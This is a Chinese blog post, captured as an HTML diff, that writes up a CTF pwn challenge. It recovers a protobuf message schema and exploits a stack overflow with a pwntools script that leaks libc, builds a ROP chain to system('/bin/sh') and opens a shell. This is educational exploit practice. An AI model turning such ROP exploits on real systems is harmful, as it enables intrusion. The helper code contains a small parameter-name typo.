@@ -1,0 +1,614 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="https://yhuanhuan01.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="https://yhuanhuan01.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="https://yhuanhuan01.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="栈劫持,protocol" />
+
+
+<link rel="canonical" href="https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/">
+
+
+
+  <title>
+protocol学习 - 复现 - PWN的学习 |
+yhuanhuan =  = 不在能知，乃在能行</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">protocol学习
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-06-28 11:10:40">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-06-28T11:10:40+08:00">2024-06-28</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>2.9k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>3 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">yhuanhuan</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/Me2Cmi6yuWvhqKF.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/c8LzaYO7NRj2Gmi.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/tNd3AzOayGcXsCk.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/HRiVouaTdMFQCYP.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/qoxySlnh7UTYwsD.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/3QaAkKnrb4hzo58.png"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" itemprop="item" rel="index" title="分类于 PWN的学习"><span itemprop="name">PWN的学习</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 复现"><span itemprop="name">复现</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/huanhuan.png">
+    <meta itemprop="name" content="yhuanhuan">
+    <meta itemprop="description" content="不在能知，乃在能行, 欢迎来到Huan的笔记空间~~~~~~🌸">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="protocol"><a class="markdownIt-Anchor" href="#protocol">#</a> protocol</h1>
+<blockquote>
+<p>前言：</p>
+<p>华中赛区题目，第一次，由此记录一下</p>
+</blockquote>
+<p>文档：<span class="exturl" data-url="aHR0cHM6Ly9wcm90b2J1Zi5kZXYvb3ZlcnZpZXcv">https://protobuf.dev/overview/</span></p>
+<p>如何去还原此结构：</p>
+<p>我的方案如下</p>
+<blockquote>
+<p>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcmluLW0vcGJ0ay5naXQ=">https://github.com/marin-m/pbtk.git</span></p>
+<p>sudo apt install protobuf-compiler</p>
+</blockquote>
+<p>先进行必要的安装配置</p>
+<p>接下来去生成导入的 py 包</p>
+<blockquote>
+<p>./extractors/from_binary.py ./pwn</p>
+<p>protoc --python_out=. ./filename.proto</p>
+</blockquote>
+<p><img data-src="/img/protocol/image-20240628092648137.png" alt="image-20240628092648137"></p>
+<p>即可得到上面文件</p>
+<h2 id="题目启动"><a class="markdownIt-Anchor" href="#题目启动">#</a> 题目启动</h2>
+<h3 id="检查保护"><a class="markdownIt-Anchor" href="#检查保护">#</a> 检查保护</h3>
+<p><img data-src="/img/protocol/image-20240628093304459.png" alt="image-20240628093304459"></p>
+<p>运行一波程序看看咋样</p>
+<p><img data-src="/img/protocol/image-20240628093431819.png" alt="image-20240628093431819"></p>
+<h3 id="测试"><a class="markdownIt-Anchor" href="#测试">#</a> 测试</h3>
+<p>输入会输出这个，去定位一下</p>
+<p><img data-src="/img/protocol/image-20240628093536176.png" alt="image-20240628093536176"></p>
+<p>if 判断 v5 是否返回 1，返回 0 则会输出 <code>Protobuf Parse Error!</code></p>
+<p><img data-src="/img/protocol/image-20240628093750454.png" alt="image-20240628093750454"></p>
+<p>可以发现，我们 v6 向 s 所在地址去输入，而 v5 所指向的函数应该是检测 s 地址内容的函数</p>
+<p>GPT 解释如下</p>
+<p><code>google::protobuf::MessageLite::ParseFromArray</code>  是 Google Protocol Buffers (protobuf) 库中用于解析二进制数据的方法。它从给定的字节数组中解析数据并将其填充到相应的 protobuf 消息中。</p>
+<p>让我们分解一下这个函数调用：</p>
+<pre><code class="language-c++">google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&amp;unk_209080, s, v6);
+</code></pre>
+<ul>
+<li>
+<p><code>google::protobuf::MessageLite</code>  是一个抽象基类，它定义了所有 protobuf 消息的基本接口和操作。 <code>ParseFromArray</code>  是这个类中的一个成员函数。</p>
+</li>
+<li>
+<p><code>ParseFromArray</code>  函数的签名通常是这样的：</p>
+<pre><code class="language-c++">bool ParseFromArray(const void* data, int size);
+</code></pre>
+<p>它从一个给定大小的字节数组 ( <code>data</code>  开始，大小为  <code>size</code> ) 中解析 protobuf 消息。</p>
+</li>
+<li>
+<p>在这个调用中：</p>
+<ul>
+<li><code>(google::protobuf::MessageLite *)&amp;unk_209080</code>  是一个指向  <code>google::protobuf::MessageLite</code>  派生类实例的指针，表示要将解析得到的数据填充到  <code>unk_209080</code>  对象中。</li>
+<li><code>s</code>  是一个指向字节数组的指针，表示数据来源。</li>
+<li><code>v6</code>  是一个整数，表示字节数组的大小（即  <code>s</code>  的长度）。</li>
+</ul>
+</li>
+</ul>
+<p>换句话说，这个函数调用试图从字节数组  <code>s</code>  中读取  <code>v6</code>  个字节，并将解析得到的消息存储到  <code>unk_209080</code>  对象中。</p>
+<p>如果解析成功， <code>ParseFromArray</code>  将返回  <code>true</code> ；如果失败，则返回  <code>false</code> 。通常情况下，失败的原因可能包括数据格式不正确或数组长度不够等。</p>
+<p>所以如果我们解析失败则不去往下去执行</p>
+<p>unk_209080 填充数据地方只有 1bit 大小空间</p>
+<p><img data-src="/img/protocol/image-20240628095136822.png" alt="image-20240628095136822"></p>
+<p>我们很难进行自己去输入测试</p>
+<p>看下结构体</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>message protoMessage <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    optional string name <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    optional string phoneNumber <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    required <span class="token builtin">bytes</span> <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    required uint32 size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>optional 可选项</p>
+<p>required 需要写入</p>
+<blockquote>
+<p>封装函数</p>
+</blockquote>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">send_payload</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">b'name'</span><span class="token punctuation">,</span> phoneNumber <span class="token operator">=</span> <span class="token string">b'phoneNumber'</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> szie<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	pl <span class="token operator">=</span> message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	pl<span class="token punctuation">.</span><span class="token builtin">buffer</span> <span class="token operator">=</span> buf</pre></td></tr><tr><td data-num="4"></td><td><pre>	pl<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">return</span> pl<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> message_pb2</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="7"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num="8"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num="9"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num="10"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num="11"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num="12"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="13"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">def</span> <span class="token function">set_payload</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> szie<span class="token punctuation">,</span> name <span class="token operator">=</span> <span class="token string">b'name'</span><span class="token punctuation">,</span> phoneNumber <span class="token operator">=</span> <span class="token string">b'phoneNumber'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	pl <span class="token operator">=</span> message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	pl<span class="token punctuation">.</span>name <span class="token operator">=</span> name</pre></td></tr><tr><td data-num="17"></td><td><pre>	pl<span class="token punctuation">.</span>phoneNumber <span class="token operator">=</span> phoneNumber</pre></td></tr><tr><td data-num="18"></td><td><pre>	pl<span class="token punctuation">.</span><span class="token builtin">buffer</span> <span class="token operator">=</span> buf</pre></td></tr><tr><td data-num="19"></td><td><pre>	pl<span class="token punctuation">.</span>size <span class="token operator">=</span> size</pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token keyword">return</span> pl<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>buf <span class="token operator">=</span> <span class="token string">b'aaaa'</span></pre></td></tr><tr><td data-num="23"></td><td><pre>size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>payload <span class="token operator">=</span> set_payload<span class="token punctuation">(</span>buf<span class="token punctuation">,</span>size<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="/img/protocol/image-20240628102847682.png" alt="image-20240628102847682"></p>
+<p>这样我们就可以成功的去执行了</p>
+<h3 id="寻找漏洞"><a class="markdownIt-Anchor" href="#寻找漏洞">#</a> 寻找漏洞</h3>
+<p><img data-src="/img/protocol/image-20240628103148873.png" alt="image-20240628103148873"></p>
+<p>n [0] 是我们输入 buf 的大小，n [1] 是我们输入的内容。而前面可以设置最大为 0x1000 很明显有栈溢出漏洞。</p>
+<p>给出给的 puts 函数的地址，构造合理的 rop 或者 one_gadget（后来发现 one_gadget 没有相应的条件</p>
+<p>完整 exp 如下</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> message_pb2</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">set_payload</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> szie<span class="token punctuation">,</span> name <span class="token operator">=</span> <span class="token string">b'name'</span><span class="token punctuation">,</span> phoneNumber <span class="token operator">=</span> <span class="token string">b'phoneNumber'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	pl <span class="token operator">=</span> message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pl<span class="token punctuation">.</span>name <span class="token operator">=</span> name</pre></td></tr><tr><td data-num="10"></td><td><pre>	pl<span class="token punctuation">.</span>phoneNumber <span class="token operator">=</span> phoneNumber</pre></td></tr><tr><td data-num="11"></td><td><pre>	pl<span class="token punctuation">.</span><span class="token builtin">buffer</span> <span class="token operator">=</span> buf</pre></td></tr><tr><td data-num="12"></td><td><pre>	pl<span class="token punctuation">.</span>size <span class="token operator">=</span> size</pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">return</span> pl<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	pause<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="20"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num="21"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num="22"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num="23"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num="24"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num="25"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="26"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment"># debug()</span></pre></td></tr><tr><td data-num="28"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Gift: 0x'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>puts_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>libcbase <span class="token operator">=</span> puts_libc <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="31"></td><td><pre>success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>system <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="33"></td><td><pre>binsh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>rdi <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x000000000002164f</span></pre></td></tr><tr><td data-num="35"></td><td><pre>ret <span class="token operator">=</span> rdi <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>ogg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f29e</span><span class="token punctuation">,</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="38"></td><td><pre>og <span class="token operator">=</span> libcbase <span class="token operator">+</span> ogg<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>buf <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x218</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>payload <span class="token operator">=</span> set_payload<span class="token punctuation">(</span>buf<span class="token punctuation">,</span>size<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>
+      <div class="tags">
+          <a href="/tags/%E6%A0%88%E5%8A%AB%E6%8C%81/" rel="tag"><i class="ic i-tag"></i> 栈劫持</a>
+          <a href="/tags/protocol/" rel="tag"><i class="ic i-tag"></i> protocol</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-06-28 11:13:00" itemprop="dateModified" datetime="2024-06-28T11:13:00+08:00">2024-06-28</time>
+  </span>
+  <span id="2024/06/28/protocol学习/" class="item leancloud_visitors" data-flag-title="protocol学习" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>yhuanhuan <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/" title="protocol学习">https://yhuanhuan01.github.io/2024/06/28/protocol学习/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/06/27/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;xABdev7CEF4h3sR.png" title="关于恢复符号表这件事2">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>关于恢复符号表这件事2</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#protocol"><span class="toc-number">1.</span> <span class="toc-text"> protocol</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%90%AF%E5%8A%A8"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目启动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 检查保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 寻找漏洞</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/08/02/find-flag/" rel="bookmark" title="find_flag">find_flag</a></li><li><a href="/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="国赛复现">国赛复现</a></li><li><a href="/2024/06/21/Ciscn-2022-blue/" rel="bookmark" title="Ciscn_2022_blue">Ciscn_2022_blue</a></li><li class="active"><a href="/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/" rel="bookmark" title="protocol学习">protocol学习</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="yhuanhuan"
+      data-src="/images/huanhuan.png">
+  <p class="name" itemprop="name">yhuanhuan</p>
+  <div class="description" itemprop="description">欢迎来到Huan的笔记空间~~~~~~🌸</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">27</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">8</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">27</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lodWFuaHVhbjAx" title="https:&#x2F;&#x2F;github.com&#x2F;yhuanhuan01"><i class="ic i-github"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjI4OTQ3NDIyMTRAcXEuY29t" title="mailto:2894742214@qq.com"><i class="ic i-envelope"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
